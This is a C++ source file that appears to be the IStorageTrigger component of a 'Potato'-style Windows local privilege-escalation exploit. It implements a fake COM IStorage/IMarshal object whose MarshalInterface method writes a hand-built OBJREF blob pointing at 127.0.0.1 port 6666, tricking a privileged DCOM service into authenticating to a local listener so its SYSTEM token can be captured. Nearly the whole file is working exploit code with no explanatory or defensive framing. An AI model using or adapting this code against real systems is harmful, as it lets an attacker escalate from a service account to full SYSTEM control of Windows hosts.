#include "stdafx.h"
#include "IStorageTrigger.h"
#include <string>
#include <wchar.h>

IStorageTrigger::IStorageTrigger(IStorage *istg) {
	_stg = istg;
	m_cRef = 1;
	return;
}

HRESULT IStorageTrigger::DisconnectObject(DWORD dwReserved) {
	return 0;
}
HRESULT IStorageTrigger::GetMarshalSizeMax(const IID &riid, void *pv, DWORD dwDestContext, void *pvDestContext, DWORD mshlflags, DWORD *pSize) {
	*pSize = 1024;
	return 0;
}
HRESULT IStorageTrigger::GetUnmarshalClass(const IID &riid, void *pv, DWORD dwDestContext, void *pvDestContext, DWORD mshlflags, CLSID *pCid) {
	CLSIDFromString(OLESTR("{00000306-0000-0000-c000-000000000046}"), pCid);
	return 0;
}
HRESULT IStorageTrigger::MarshalInterface(IStream *pStm, const IID &riid, void *pv, DWORD dwDestContext, void *pvDestContext, DWORD mshlflags) {
	byte data[] = { 0x4D, 0x45, 0x4F, 0x57, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x94, 0x09, 0x34, 0x76,
		0xC0, 0xF0, 0x15, 0xD8, 0x19, 0x8F, 0x4A, 0xA2, 0xCE, 0x05, 0x60, 0x86, 0xA3, 0x2A, 0x0F, 0x09, 0x24, 0xE8, 0x70,
		0x2A, 0x85, 0x65, 0x3B, 0x33, 0x97, 0xAA, 0x9C, 0xEC, 0x16, 0x00, 0x12, 0x00, 0x07, 0x00, 0x31, 0x00, 0x32, 0x00,
		0x37, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x2E, 0x00, 0x31, 0x00, 0x5B, 0x00, 0x36, 0x00, 0x36,
		0x00, 0x36, 0x00, 0x36, 0x00, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0A, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00 };
	ULONG written = 0;
	int szData = sizeof(data);
	pStm->Write(&data, sizeof(data), &written);
	return 0;
}
HRESULT IStorageTrigger::ReleaseMarshalData(IStream *pStm) {
	return 0;
}
HRESULT IStorageTrigger::UnmarshalInterface(IStream *pStm, const IID &riid, void **ppv) {
	*ppv = 0;
	return 0;
}
HRESULT IStorageTrigger::Commit(DWORD grfCommitFlags) {
	_stg->Commit(grfCommitFlags);
	return 0;
}
HRESULT IStorageTrigger::CopyTo(DWORD ciidExclude, const IID *rgiidExclude, SNB snbExclude, IStorage *pstgDest) {
	_stg->CopyTo(ciidExclude, rgiidExclude, snbExclude, pstgDest);
	return 0;
}
HRESULT IStorageTrigger::CreateStorage(const OLECHAR *pwcsName, DWORD grfMode, DWORD reserved1, DWORD reserved2, IStorage **ppstg) {
	_stg->CreateStorage(pwcsName, grfMode, reserved1, reserved2, ppstg);
	return 0;
}
HRESULT IStorageTrigger::CreateStream(const OLECHAR *pwcsName, DWORD grfMode, DWORD reserved1, DWORD reserved2, IStream **ppstm) {
	_stg->CreateStream(pwcsName, grfMode, reserved1, reserved2, ppstm);
	return 0;
}
HRESULT IStorageTrigger::DestroyElement(const OLECHAR *pwcsName) {
	_stg->DestroyElement(pwcsName);
	return 0;
}
HRESULT IStorageTrigger::EnumElements(DWORD reserved1, void *reserved2, DWORD reserved3, IEnumSTATSTG **ppenum) {
	_stg->EnumElements(reserved1, reserved2, reserved3, ppenum);
	return 0;
}
HRESULT IStorageTrigger::MoveElementTo(const OLECHAR *pwcsName, IStorage *pstgDest, const OLECHAR *pwcsNewName, DWORD grfFlags) {
	_stg->MoveElementTo(pwcsName, pstgDest, pwcsNewName, grfFlags);
	return 0;
}
HRESULT IStorageTrigger::OpenStorage(const OLECHAR *pwcsName, IStorage *pstgPriority, DWORD grfMode, SNB snbExclude, DWORD reserved, IStorage **ppstg) {
	_stg->OpenStorage(pwcsName, pstgPriority, grfMode, snbExclude, reserved, ppstg);
	return 0;
}
HRESULT IStorageTrigger::OpenStream(const OLECHAR *pwcsName, void *reserved1, DWORD grfMode, DWORD reserved2, IStream **ppstm) {
	_stg->OpenStream(pwcsName, reserved1, grfMode, reserved2, ppstm);
	return 0;
}
HRESULT IStorageTrigger::RenameElement(const OLECHAR *pwcsOldName, const OLECHAR *pwcsNewName) {
	return 0;
}
HRESULT IStorageTrigger::Revert() {
	return 0;
}
HRESULT IStorageTrigger::SetClass(const IID &clsid) {
	return 0;
}
HRESULT IStorageTrigger::SetElementTimes(const OLECHAR *pwcsName, const FILETIME *pctime, const FILETIME *patime, const FILETIME *pmtime) {
	return 0;
}
HRESULT IStorageTrigger::SetStateBits(DWORD grfStateBits, DWORD grfMask) {
	return 0;
}
HRESULT IStorageTrigger::Stat(STATSTG *pstatstg, DWORD grfStatFlag) {
	_stg->Stat(pstatstg, grfStatFlag);

	//Allocate from heap because apparently this will get freed in OLE32
	const wchar_t c_s[] = L"hello.stg";
	wchar_t *s = (wchar_t*)CoTaskMemAlloc(sizeof(c_s));
	wcscpy(s, c_s);
	pstatstg[0].pwcsName = s;
	return 0;
}

///////////////////////IUknown Interface
HRESULT IStorageTrigger::QueryInterface(const IID &riid, void **ppvObj) {
	// Always set out parameter to NULL, validating it first.
	if (!ppvObj)
		return E_INVALIDARG;
	if (riid == IID_IUnknown)
	{
		*ppvObj = static_cast<IStorageTrigger *>(this);
		//reinterpret_cast<IUnknown*>(*ppvObj)->AddRef();
	}
	else if (riid == IID_IStorage)
	{
		*ppvObj = static_cast<IStorageTrigger *>(this);
	}
	else if (riid == IID_IMarshal)
	{
		*ppvObj = static_cast<IStorageTrigger *>(this);
	}
	else
	{
		*ppvObj = NULL;
		return E_NOINTERFACE;
	}
	// Increment the reference count and return the pointer.

	return S_OK;

}


ULONG IStorageTrigger::AddRef() {
	m_cRef++;
	return m_cRef;
}

ULONG IStorageTrigger::Release() {
	// Decrement the object's internal counter.
	ULONG ulRefCount = m_cRef--;
	return ulRefCount;
}
